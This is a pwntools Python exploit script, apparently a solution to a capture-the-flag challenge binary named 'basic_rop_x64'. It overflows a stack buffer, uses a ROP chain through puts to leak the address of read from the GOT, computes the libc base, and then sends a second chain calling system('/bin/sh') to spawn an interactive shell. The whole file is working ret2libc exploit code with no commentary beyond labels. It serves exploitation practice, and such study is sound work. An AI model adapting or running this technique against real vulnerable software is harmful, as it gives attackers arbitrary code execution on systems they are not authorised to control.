from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))


p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64")
libc = e.libc
r = ROP(e)

#context.log_level = 'debug'

puts_plt = e.plt['puts']
read_got = e.got['read']

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
binsh_offset = list(libc.search(b"/bin/sh"))[0]

main = e.symbols['main']
ret = r.find_gadget(['ret'])[0]
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]

payload = b'A' * 72


# puts(read@got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)


# return to vuln
payload += p64(main)


p.send(payload)

p.recvuntil(b'A' * 64)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = lb + binsh_offset

slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)

payload = b'A' * 72

# system("/bin/sh")
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 64)

p.interactive()

